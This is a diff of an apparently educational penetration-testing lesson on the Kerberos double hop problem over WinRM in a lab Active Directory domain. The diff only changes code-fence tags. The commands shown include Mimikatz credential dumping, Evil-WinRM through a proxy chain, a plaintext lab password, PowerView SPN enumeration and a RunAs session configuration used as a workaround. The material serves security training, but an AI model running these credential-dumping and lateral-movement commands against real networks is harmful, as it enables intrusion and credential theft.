@@ -14,8 +14,7 @@ The crux of the issue is that when using WinRM to authenticate over two or more 
 
 Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the `backupadm` user in memory.
 
-```
-        powershell
+```powershell
 PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
 [DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
 [DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -272,8 +271,7 @@ Bye!
 
 There are indeed processes running in the context of the `backupadm` user, such as `wsmprovhost.exe`, which is the process that spawns when a Windows Remote PowerShell session is spawned.
 
-```
-        powershell
+```powershell
 [DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
 wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                              0:00:03 N/A
@@ -307,8 +305,7 @@ We can also connect to the remote host via host A and set up a PSCredential obje
 
 After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
 
 |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
@@ -325,8 +322,7 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\Users\backupadm\Documents> klist
 
 Current LogonId is 0:0x57f8a
@@ -347,8 +343,7 @@ Cached Tickets: (1)
 
 So now, let's set up a PSCredential object and try again. First, we set up our authentication.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
 
 |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
@@ -358,8 +353,7 @@ So now, let's set up a PSCredential object and try again. First, we set up our a
 
 Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
 
 |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
@@ -384,8 +378,7 @@ vmwarescvc
 
 If we try again without specifying the `-credential` flag, we once again get an error message.
 
-```
-        shellsession
+```shellsession
 get-domainuser -spn | select 
 
 *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 
@@ -403,8 +396,7 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.
 
-```
-        cmd
+```bat
 C:\htb> klist
 
 Current LogonId is 0:0x1e5b8b
@@ -464,15 +456,13 @@ We've seen what we can do to overcome this problem when using a tool such as `ev
 
 Let's start by first establishing a WinRM session on the remote host.
 
-```
-        powershell
+```powershell
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
 ```
 
 If we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.
 
-```
-        powershell
+```powershell
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
 
 Current LogonId is 0:0x11e387
@@ -493,8 +483,7 @@ Cached Tickets: (1)
 
 We also cannot interact directly with the DC using PowerView
 
-```
-        powershell
+```powershell
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
 
@@ -509,8 +498,7 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.
 
-```
-        powershell
+```powershell
 PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
 
  WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
@@ -534,8 +522,7 @@ Once this is done, we need to restart the WinRM service by typing `Restart-Servi
 After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and
 all requests from our local machine will be sent directly to the Domain Controller.
 
-```
-        powershell
+```powershell
 PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
 [DEV01]: PS C:\Users\backupadm\Documents> klist
 
@@ -557,8 +544,7 @@ Cached Tickets: (1)
 
 We can now run tools such as PowerView without having to create a new PSCredential object.
 
-```
-        powershell
+```powershell
 [DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
 
 samaccountname
